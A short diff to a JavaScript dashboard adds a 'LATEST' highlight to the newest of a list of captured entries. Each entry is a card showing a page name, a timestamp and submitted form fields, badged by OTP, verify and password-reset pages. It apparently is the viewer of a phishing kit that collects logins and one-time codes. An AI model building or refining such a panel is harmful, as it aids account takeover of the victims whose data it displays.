@@ -231,7 +231,9 @@
 
         // Render cards
         let html = '<div class="entries-container">';
-        data.slice().reverse().forEach((entry, index) => {
+        const reversedData = data.slice().reverse();
+        
+        reversedData.forEach((entry, index) => {
           const fields = entry.fields || {};
           const page = entry.page || 'Unknown';
           const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
@@ -244,10 +246,15 @@
           else if (pageLower.includes('otp') || pageLower.includes('verify')) badgeClass = 'otp';
           else if (pageLower.includes('password') || pageLower.includes('reset')) badgeClass = 'password-reset';
           
+          // Check if this is the latest entry (first in reversed array)
+          const isLatest = index === 0;
+          const highlightStyle = isLatest ? 'border: 2px solid #fe2c55; background: rgba(254,44,85,0.05);' : '';
+          const latestBadge = isLatest ? '<span style="display:inline-block; margin-left: 12px; padding: 4px 10px; background: #fe2c55; color: #fff; border-radius: 4px; font-size: 11px; font-weight: 700;">LATEST</span>' : '';
+          
           html += `
-            <div class="entry-card">
+            <div class="entry-card" style="${highlightStyle}">
               <div class="entry-header">
-                <span class="entry-badge ${badgeClass}">${page}</span>
+                <span class="entry-badge ${badgeClass}">${page}${latestBadge}</span>
                 <span class="entry-time">${time}</span>
               </div>
               <div class="entry-fields">
